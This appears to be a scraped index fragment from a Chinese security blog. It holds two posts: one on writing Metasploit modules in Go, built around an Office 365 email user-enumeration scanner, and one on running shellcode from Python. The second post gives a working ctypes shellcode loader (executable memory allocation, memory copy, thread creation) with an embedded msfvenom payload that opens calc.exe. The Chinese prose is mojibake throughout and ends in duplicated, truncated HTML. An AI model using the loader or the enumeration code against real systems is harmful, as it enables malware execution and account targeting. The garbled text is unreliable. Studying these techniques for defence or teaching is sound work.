7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 //usr/bin/env go run \u0026#34;$0\u0026#34; \u0026#34;$@\u0026#34;; exit \u0026#34;$?\u0026#34; package main import ( \u0026#34;crypto/tls\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;metasploit/module\u0026#34; \u0026#34;msmail\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;sync\u0026#34; ) func main() { metadata := \u0026amp;module.Metadata{ Name: \u0026#34;Exchange email enumeration\u0026#34;, Description: \u0026#34;Error-based user enumeration for Office 365 integrated email addresses\u0026#34;, Authors: []string{\u0026#34;poptart\u0026#34;, \u0026#34;jlarose\u0026#34;, \u0026#34;Vincent Yiu\u0026#34;, \u0026#34;grimhacker\u0026#34;, \u0026#34;Nate Power\u0026#34;, \u0026#34;Nick Powers\u0026#34;, \u0026#34;clee-r7\u0026#34;}, Date: \u0026#34;2018-11-06\u0026#34;, Type: \u0026#34;single_scanner\u0026#34;, Privileged: false, References: []module.Reference{}, Options: map[string]module.Option{ \u0026#34;RHOSTS\u0026#34;: {Type: \u0026#34;string\u0026#34;, Description: \u0026#34;Target endpoint\u0026#34;, Required: true, Default: \u0026#34;outlook.office365.com\u0026#34;}, \u0026#34;EMAIL\u0026#34;: {Type: \u0026#34;string\u0026#34;, Description: \u0026#34;Single email address to do identity test against\u0026#34;, Required: false, Default: \u0026#34;\u0026#34;}, \u0026#34;EMAIL_FILE\u0026#34;: {Type: \u0026#34;string\u0026#34;, Description: \u0026#34;Path to file containing list of email addresses\u0026#34;, Required: false, Default: \u0026#34;\u0026#34;}, }} module.Init(metadata, run_exchange_enum) } é¦–å…ˆå¼€å¤´å°±æ˜¯æˆ‘ä»¬åˆšæ‰æ‰€è°ˆåˆ°çš„æ ¼å¼ï¼Œé¦–å…ˆæ˜¯é¡¶è¡Œçš„å›ºå®šæ ¼å¼ï¼Œç„¶åmainæ–¹æ³•æ˜¯å®šä¹‰äº†å…ƒæ•°æ®ä¿¡æ¯ï¼Œé‡Œé¢å®šä¹‰è¿™ä¸ªæ¨¡å—çš„åŸºæœ¬ä¿¡æ¯ï¼Œ ç„¶åå®šä¹‰äº†æ¨¡å—çš„ä¸‰ä¸ªå‚æ•°é¡¹ RHOSTSã€EMAILã€EMAIL_FILEï¼Œç´§æ¥ç€è°ƒç”¨äº† module.Init\nå…¥å£æ–¹æ³•æ˜¯ run_exchange_enum\næˆ‘ä»¬çœ‹çœ‹è¿™ä¸ªæ–¹æ³•çš„æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 func run_exchange_enum(params map[string]interface{}) { email := params[\u0026#34;EMAIL\u0026#34;].(string) emailFile := params[\u0026#34;EMAIL_FILE\u0026#34;].(string) threads, e := strconv.Atoi(params[\u0026#34;THREADS\u0026#34;].(string)) ip := params[\u0026#34;rhost\u0026#34;].(string) if e != nil { module.LogError(\u0026#34;Unable to parse \u0026#39;Threads\u0026#39; value using default (5)\u0026#34;) threads = 5 } if threads \u0026gt; 100 { module.LogInfo(\u0026#34;Threads value too large, setting max(100)\u0026#34;) threads = 100 } if email == \u0026#34;\u0026#34; \u0026amp;\u0026amp; emailFile == \u0026#34;\u0026#34; { module.LogError(\u0026#34;Expected \u0026#39;EMAIL\u0026#39; or \u0026#39;EMAIL_FILE\u0026#39; field to be populated\u0026#34;) return } var validUsers []string if email != \u0026#34;\u0026#34; { validUsers = o365enum(ip, []string{email}, threads) } if emailFile != \u0026#34;\u0026#34; { validUsers = o365enum(ip, msmail.ImportUserList(emailFile), threads) } msmail.ReportValidUsers(ip, validUsers) } é¦–å…ˆæ–¹æ³•çš„å¼€å¤´å–äº†æ¨¡å—çš„åŸºæœ¬é…ç½®ä¿¡æ¯ï¼Œç´§æ¥ç€æ˜¯ä¸€ç³»åˆ—åˆ¤æ–­ï¼Œç„¶åæˆ‘ä»¬çœ‹åˆ°å…³é”®çš„ä»£ç \n1 2 3 4 5 6 7 8 9 10 var validUsers []string if email != \u0026#34;\u0026#34; { validUsers = o365enum(ip, []string{email}, threads) } if emailFile != \u0026#34;\u0026#34; { validUsers = o365enum(ip, msmail.ImportUserList(emailFile), threads) } msmail.ReportValidUsers(ip, validUsers) o365enum æ–¹æ³•å°±åœ¨è¿™ä¸ªæ–¹æ³•çš„ä¸‹é¢ï¼Œä½†æ˜¯è¿™é‡Œå¹¶ä¸æ˜¯æˆ‘ä»¬è®¨è®ºçš„é‡ç‚¹ï¼Œæ˜¯ä»€ä¹ˆæˆ‘ä»¬ä¸ç®¡ï¼Œåªéœ€è¦çŸ¥é“ï¼Œä»–æ‰§è¡Œäº†ä¸€äº›æšä¸¾éå†çš„æ“ä½œï¼Œè¿”å›äº†å¯ç”¨çš„ç”¨æˆ·ï¼Œæ“ä½œæ€ä¹ˆåšçš„ä¸åœ¨æˆ‘ä»¬çš„è®¨è®ºé‡ç‚¹å†…\nç„¶åè°ƒç”¨äº† msmail.ReportValidUsers(ip, validUsers)\nå‰é¢æˆ‘ä»¬è¯´è¿‡ï¼Œå¹¶ä¸æ”¯æŒç¬¬ä¸‰æ–¹åº“ï¼Œmsmailæ˜¯ä»–è‡ªå·±åœ¨ share/src ä¸‹åˆ›å»ºçš„ä¸€ä¸ªåº“ï¼Œå…·ä½“ä»£ç å¯ä»¥åœ¨https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/msmail/shared/src/msmail/msmail.goçœ‹åˆ°\næˆ‘ä»¬ç›´æ¥å®šä½åˆ°æˆ‘ä»¬åˆšæ‰è¯´åˆ°çš„ msmail.ReportValidUsers\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package msmail import ( ... \u0026#34;metasploit/module\u0026#34; ... ) ... func ReportValidUsers(ip string, validUsers []string) { port := \u0026#34;443\u0026#34; service := \u0026#34;owa\u0026#34; protocol := \u0026#34;tcp\u0026#34; for _, user := range validUsers { opts := map[string]string{ \u0026#34;port\u0026#34;: port, \u0026#34;service_name\u0026#34;: service, \u0026#34;address\u0026#34;: ip, \u0026#34;protocol\u0026#34;: protocol, } module.LogInfo(\u0026#34;Loging user: \u0026#34; + user) module.ReportCredentialLogin(user, \u0026#34;\u0026#34;, opts) } } è¿™é‡Œé¢æŠŠä¼ è¿‡æ¥çš„ç”¨æˆ·åéå†äº†ç„¶åè°ƒç”¨äº†\n1 2 module.LogInfo(\u0026#34;Loging user: \u0026#34; + user) module.ReportCredentialLogin(user, \u0026#34;\u0026#34;, opts) å‰ä¸€ä¸ªæ–¹æ³•æˆ‘ä»¬èƒ½çŒœåˆ°æ˜¯æ—¥å¿—è¾“å‡º åä¸€ä¸ªå‘¢ï¼Ÿæˆ‘ä»¬éƒ½è·Ÿè¿‡å»çœ‹çœ‹\nhttps://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/modules/external/go/src/metasploit/module/core.go 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 func rpcSend(res interface{}) error { rpcMutex.Lock() defer rpcMutex.Unlock() resStr, err := json.Marshal(res) if err != nil { return err } f := bufio.NewWriter(os.Stdout) if _, err := f.Write(resStr); err != nil { return err } if err := f.Flush(); err != nil { return err } return nil } ... func LogInfo(message string) { msfLog(message, \u0026#34;info\u0026#34;) } ... func msfLog(message string, level string) { req := \u0026amp;logRequest{\u0026#34;2.0\u0026#34;, \u0026#34;message\u0026#34;, logparams{level, message}} if err := rpcSend(req); err != nil { log.Fatal(err) } } å¯ä»¥çœ‹åˆ° module.LogInfo æ˜¯åŸºç¡€çš„æ—¥å¿—è¾“å‡º\nhttps://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/modules/external/go/src/metasploit/module/report.go 1 2 3 4 5 6 7 8 9 10 11 12 13 14 func ReportCredentialLogin(username string, password string, opts map[string]string) { base := map[string]string{\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password} if err := report(\u0026#34;credential_login\u0026#34;, base, opts); err != nil { log.Fatal(err) } } func report(kind string, base map[string]string, opts map[string]string) error { for k, v := range base { opts[k] = v } req := \u0026amp;reportRequest{\u0026#34;2.0\u0026#34;, \u0026#34;report\u0026#34;, reportparams{kind, opts}} return rpcSend(req) } è¿™ä¸ªæ–¹æ³•å°±æ˜¯å¾ˆç®€å•çš„æŠŠæ•°æ®ç•¥å¾®å‹å¥½å‹å±•ç¤ºäº†ä¸€ä¸‹\næ‰€ä»¥æ•´ä¸ªçš„æµç¨‹å°±æ˜¯é€‰æ‹©å¥½æ¨¡å—ï¼Œè®¾ç½®å¥½å‚æ•°ï¼Œmodule.Init è¿›å»ï¼Œç„¶åç›´æ¥ runï¼Œå°±æ‰§è¡Œ module.Init ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥çš„å›è°ƒæ–¹æ³•\nç„¶ååé¢å°±åªæ˜¯ä½ ç”¨golangè¿›è¡Œå…¶ä»–æ“ä½œæœ€åå†è¿›è¡Œè°ƒç”¨msfå…¬æœ‰æ¨¡å—è¿›è¡Œä¿¡æ¯å±•ç¤ºäº†\nReferences https://github.com/rapid7/metasploit-framework/wiki/Writing-External-GoLang-Modules https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/msmail/exchange_enum.go https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/modules/external/go/src/metasploit/module ","permalink":"https://www.hacktech.cn/post/write-msf-module-in-go.html","summary":"\u003cp\u003eæœ€è¿‘æœ‰ç©ºåœ¨çœ‹msfï¼Œå‘ç°msfé‡Œé¢æœ‰æ¨¡å—çš„æºç æ˜¯golangçš„ï¼Œå»ç¿»äº†ç¿»wikiï¼Œwikiä¸Šé¢çš„ç¼–å†™æ—¥æœŸæ˜¯2018.12.13ï¼Œæœäº†ä¸‹å›½å†…ï¼Œå¥½åƒæ²¡æœ‰è¿™æ–¹é¢çš„æ–‡ç« ï¼Œé‚£å°±è‡ªå·±è·Ÿç€åšåšè®°ä¸ªç¬”è®°\u003c/p\u003e","title":"å¦‚ä½•ç”¨Golangå†™msfæ’ä»¶æ¨¡å—"},{"content":"ç”Ÿæˆ é¦–å…ˆç”Ÿæˆä¸€ä¸ªæµ‹è¯•çš„msf shellcode\n1 msfvenom -p windows/x64/exec CMD=calc.exe -f python æŠŠå…¶ä¸­çš„shellcodeå¤åˆ¶å‡ºæ¥ç•™å¾…å¾…ä¼šä½¿ç”¨\nåŸç† å¤§éƒ¨åˆ†è„šæœ¬è¯­è¨€åŠ è½½ shellcode å…¶å®éƒ½æ˜¯é€šè¿‡ c çš„ ffi å»è°ƒç”¨æ“ä½œç³»ç»Ÿçš„apiï¼Œå…¶å®å¹¶æ²¡æœ‰å¤ªå¤šçš„æŠ€å·§åœ¨é‡Œé¢ï¼Œæ˜ç™½äº†åŸç†ï¼Œåªéœ€è¦æŸ¥ä¸€ä¸‹å¯¹åº”çš„è„šæœ¬è¯­è¨€æ€ä¹ˆè°ƒç”¨ c å³å¯ã€‚\né‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ˜ç™½ c é€šå¸¸æ˜¯æ€ä¹ˆåŠ è½½ shellcode çš„å³å¯ä¸€é€šç™¾é€šã€‚\né‚£ä¹ˆ c æ˜¯æ€ä¹ˆåŠ è½½ shellcode å‘¢ï¼Œæˆ‘ä»¬ç›´æ¥ä»æ±‡ç¼–å¼€å§‹æ¢ç©¶ã€‚\nshellcode è¿™ä¸ªä¸œè¥¿æˆ‘ä»¬æ˜ç™½æ˜¯ä¸€ä¸²å¯æ‰§è¡Œçš„äºŒè¿›åˆ¶ï¼ˆä¸€èˆ¬å¯æ‰§è¡Œæ–‡ä»¶çš„æ‹¥æœ‰å¯æ‰§è¡Œæƒé™çš„sectionä¸º.textï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆé€šè¿‡å…¶ä»–çš„æ‰‹æ®µå¼€è¾Ÿä¸€ç‰‡æ‹¥æœ‰å¯è¯»å¯å†™å¯æ‰§è¡Œæƒé™çš„åŒºåŸŸæ”¾å…¥æˆ‘ä»¬çš„ shellcodeï¼Œç„¶åè·³è½¬åˆ° shellcode é¦–åœ°å€å»æ‰§è¡Œå°±è¡Œäº†ï¼Œæ±‡ç¼–é‡Œé¢æ”¹å˜eipï¼ˆå³å½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡å³å°†è¿è¡ŒæŒ‡ä»¤çš„è™šæ‹Ÿåœ°å€ï¼‰çš„æ–¹æ³•æœ‰ä¸å°‘ï¼Œæœ€ç®€å•çš„å°±æ˜¯ç›´æ¥ jmp è¿‡å»äº†ã€‚ä¹Ÿå°±æ˜¯å†™æˆä¼ªç å¤§æ¦‚æ„æ€å°±æ˜¯ï¼ˆåŠ¨æ€ç”³è¯·å†…å­˜å°±ä¸å†™äº†ï¼‰\n1 2 lea eax, shellcode; jmp eax; é‚£ä¹ˆæˆ‘ä»¬ç”¨ c æ€ä¹ˆè¡¨ç¤ºå‘¢ï¼Ÿæˆ‘è¿™é‡Œä¹Ÿå†™ä¸€æ®µä¼ªç ï¼ˆå› ä¸ºæœ¬æ–‡çš„é‡ç‚¹å¹¶ä¸æ˜¯åœ¨äº c ä»£ç çš„ç¼–å†™ï¼‰\né‚£ä¹ˆæŒ‰ç…§åˆšæ‰çš„æ€è·¯ï¼Œå…ˆç”³è¯·ä¸€å—å¯æ‰§è¡Œçš„å†…å­˜ï¼Œæ”¾å…¥ shellcode ç„¶åè·³è½¬è¿‡å»æ‰§è¡Œå³å¯ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // shellcode unsigned char shellcode[] = \u0026#34;\\xd9\\xeb\\x9b\\xd9\\x74\\x24\\xf4\\x31\\xd2\\xb2\\x77\\x31\\xc9\u0026#34; \u0026#34;\\x64\\x8b\\x71\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\\x46\\x08\u0026#34; \u0026#34;\\x8b\\x7e\\x20\\x8b\\x36\\x38\\x4f\\x18\\x75\\xf3\\x59\\x01\\xd1\u0026#34; ...; // å®šä¹‰ä¸€ä¸ªå‡½æ•°ç±»å‹ typedef void (__stdcall *CODE) (); // ç”³è¯·å†…å­˜ PVOID p = NULL; p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // æŠŠshellcodeæ”¾å…¥å†…å­˜ memcpy(p, shellcode, sizeof(shellcode)); CODE code =(CODE)p; code(); æˆ‘å¹¶æ²¡æœ‰å†™å‡ºä¸€ä¸ªå¯ç”¨çš„ c åŠ è½½ shellcodeï¼Œåªæ˜¯æ—¨åœ¨ç‚¹å‡ºä¸€ä¸‹æµç¨‹ï¼Œç„¶åå¼•å‡ºåé¢çš„ python åŠ è½½ shellcodeï¼Œä¸Šé¢æˆ‘ä»¬å…ˆç”³è¯·äº†ä¸€å—å¸¦æœ‰å¯è¯»å¯å†™å¯æ‰§è¡Œæƒé™çš„å†…å­˜ï¼Œç„¶åæŠŠ shellcode æ”¾è¿›å»ï¼Œç„¶åæˆ‘ä»¬å¼ºè½¬ä¸ºä¸€ä¸ªå‡½æ•°ç±»å‹æŒ‡é’ˆï¼Œæœ€åè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œè¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚\nPythonå®ç° å‰é¢æˆ‘è¯´è¿‡ï¼Œå¤§éƒ¨åˆ†è„šæœ¬è¯­è¨€åŠ è½½ shellcode éƒ½æ˜¯è°ƒç”¨çš„cçš„ffiï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æŒ‰ç…§ä¹‹å‰çš„æ€è·¯æ¥å°±è¡Œäº†ã€‚ä¸‹é¢æˆ‘ç›´æ¥è´´ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 import ctypes shellcode = b\u0026#34;\u0026#34; shellcode += b\u0026#34;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\u0026#34; shellcode += b\u0026#34;\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\u0026#34; shellcode += b\u0026#34;\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\u0026#34; shellcode += b\u0026#34;\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\u0026#34; shellcode += b\u0026#34;\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\u0026#34; shellcode += b\u0026#34;\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\u0026#34; shellcode += b\u0026#34;\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\u0026#34; shellcode += b\u0026#34;\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\u0026#34; shellcode += b\u0026#34;\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\u0026#34; shellcode += b\u0026#34;\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\u0026#34; shellcode += b\u0026#34;\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\u0026#34; shellcode += b\u0026#34;\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\u0026#34; shellcode += b\u0026#34;\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\u0026#34; shellcode += b\u0026#34;\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\u0026#34; shellcode += b\u0026#34;\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\u0026#34; shellcode += b\u0026#34;\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\u0026#34; shellcode += b\u0026#34;\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\u0026#34; shellcode += b\u0026#34;\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\u0026#34; shellcode += b\u0026#34;\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\u0026#34; shellcode += b\u0026#34;\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\u0026#34; shellcode += b\u0026#34;\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\u0026#34; shellcode += b\u0026#34;\\x78\\x65\\x00\u0026#34; shellcode = bytearray(shellcode) # è®¾ç½®VirtualAllocè¿”å›ç±»å‹ä¸ºctypes.c_uint64 ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 # ç”³è¯·å†…å­˜ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) # æ”¾å…¥shellcode buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)) ) # åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ä»shellcodeé˜²æ­¢ä½ç½®é¦–åœ°å€å¼€å§‹æ‰§è¡Œ handle = ctypes.windll.kernel32.CreateThread( ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)) ) # ç­‰å¾…ä¸Šé¢åˆ›å»ºçš„çº¿ç¨‹è¿è¡Œå®Œ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1)) æ³¨æ„å…¶ä¸­çš„çš„æ¯ä¸ª c_uint64ï¼Œè¿™ä¸ªç±»å‹åœ¨64ä½ä¸Šæ˜¯å¿…è¦çš„ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æŒ‡å®š argtypes å’Œ restype ï¼Œå¦åˆ™é»˜è®¤çš„æ˜¯ 32 ä½æ•´å‹ã€‚\næˆ‘çš„ä»£ç é‡Œé¢åŠ äº†æ³¨é‡Šï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒåŸºæœ¬æ€è·¯ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå…ˆåˆ†é…ä¸€å—å¯è¯»å¯å†™å¯æ‰§è¡Œä»£ç çš„å†…å­˜ï¼Œåœ¨ä»£ç ä¸­ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯ 0x40ï¼ˆPAGE_EXECUTE_READWRITEï¼‰å’Œ 0x3000 ( 0x1000 | 0x2000)(MEM_COMMIT | MEM_RESERVE)ï¼Œç„¶åæŠŠ shellcode å¡è¿›å»ï¼Œè·³è¿‡å»è¿è¡Œã€‚\nç›¸ä¿¡é€šè¿‡è¿™ä¸€ç‰‡æ–‡ç« çš„è®²è§£ä½ èƒ½å¤Ÿå¯¹ shellcode çš„æœ¬è´¨æœ‰æ›´å¤šçš„äº†è§£ã€‚\n","permalink":"https://www.hacktech.cn/post/run-shellcode-in-py.html","summary":"\u003ch2 id=\"ç”Ÿæˆ\"\u003eç”Ÿæˆ\u003c/h2\u003e\n\u003cp\u003eé¦–å…ˆç”Ÿæˆä¸€ä¸ªæµ‹è¯•çš„msf shellcode\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emsfvenom -p windows/x64/exec CMD\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ecalc.exe -f python\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/2cbc73b0e4018b2761dcfd1584da6661..png\" alt=\"enter description here\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eæŠŠå…¶ä¸­çš„shellcodeå¤åˆ¶å‡ºæ¥ç•™å¾…å¾…ä¼šä½¿ç”¨\u003c/p\u003e\n\u003ch2 id=\"åŸç†\"\u003eåŸç†\u003c/h2\u003e\n\u003cp\u003eå¤§éƒ¨åˆ†è„šæœ¬è¯­è¨€åŠ è½½ shellcode å…¶å®éƒ½æ˜¯é€šè¿‡ \u003ccode\u003ec\u003c/code\u003e çš„ \u003ccode\u003effi\u003c/code\u003e å»è°ƒç”¨æ“ä½œç³»ç»Ÿçš„apiï¼Œå…¶å®å¹¶æ²¡æœ‰å¤ªå¤šçš„æŠ€å·§åœ¨é‡Œé¢ï¼Œæ˜ç™½äº†åŸç†ï¼Œåªéœ€è¦æŸ¥ä¸€ä¸‹å¯¹åº”çš„è„šæœ¬è¯­è¨€æ€ä¹ˆè°ƒç”¨ \u003ccode\u003ec\u003c/code\u003e å³å¯ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ˜ç™½ \u003ccode\u003ec\u003c/code\u003e é€šå¸¸æ˜¯æ€ä¹ˆåŠ è½½ \u003ccode\u003eshellcode\u003c/code\u003e çš„å³å¯ä¸€é€šç™¾é€šã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆ \u003ccode\u003ec\u003c/code\u003e æ˜¯æ€ä¹ˆåŠ è½½ \u003ccode\u003eshellcode\u003c/code\u003e å‘¢ï¼Œæˆ‘ä»¬ç›´æ¥ä»æ±‡ç¼–å¼€å§‹æ¢ç©¶ã€‚\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eshellcode\u003c/code\u003e è¿™ä¸ªä¸œè¥¿æˆ‘ä»¬æ˜ç™½æ˜¯ä¸€ä¸²å¯æ‰§è¡Œçš„äºŒè¿›åˆ¶ï¼ˆä¸€èˆ¬å¯æ‰§è¡Œæ–‡ä»¶çš„æ‹¥æœ‰å¯æ‰§è¡Œæƒé™çš„sectionä¸º.textï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆé€šè¿‡å…¶ä»–çš„æ‰‹æ®µå¼€è¾Ÿä¸€ç‰‡æ‹¥æœ‰å¯è¯»å¯å†™å¯æ‰§è¡Œæƒé™çš„åŒºåŸŸæ”¾å…¥æˆ‘ä»¬çš„ \u003ccode\u003eshellcode\u003c/code\u003eï¼Œç„¶åè·³è½¬åˆ° \u003ccode\u003eshellcode\u003c/code\u003e é¦–åœ°å€å»æ‰§è¡Œå°±è¡Œäº†ï¼Œæ±‡ç¼–é‡Œé¢æ”¹å˜eipï¼ˆå³å½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡å³å°†è¿è¡ŒæŒ‡ä»¤çš„è™šæ‹Ÿåœ°å€ï¼‰çš„æ–¹æ³•æœ‰ä¸å°‘ï¼Œæœ€ç®€å•çš„å°±æ˜¯ç›´æ¥ \u003ccode\u003ejmp\u003c/code\u003e è¿‡å»äº†ã€‚ä¹Ÿå°±æ˜¯å†™æˆä¼ªç å¤§æ¦‚æ„æ€å°±æ˜¯ï¼ˆåŠ¨æ€ç”³è¯·å†…å­˜å°±ä¸å†™äº†ï¼‰\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elea eax, shellcode;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ejmp eax;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eé‚£ä¹ˆæˆ‘ä»¬ç”¨ \u003ccode\u003ec\u003c/code\u003e æ€ä¹ˆè¡¨ç¤ºå‘¢ï¼Ÿæˆ‘è¿™é‡Œä¹Ÿå†™ä¸€æ®µä¼ªç ï¼ˆå› ä¸ºæœ¬æ–‡çš„é‡ç‚¹å¹¶ä¸æ˜¯åœ¨äº \u003ccode\u003ec\u003c/code\u003e ä»£ç çš„ç¼–å†™ï¼‰\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆæŒ‰ç…§åˆšæ‰çš„æ€è·¯ï¼Œå…ˆç”³è¯·ä¸€å—å¯æ‰§è¡Œçš„å†…å­˜ï¼Œæ”¾å…¥ \u003ccode\u003eshellcode\u003c/code\u003e 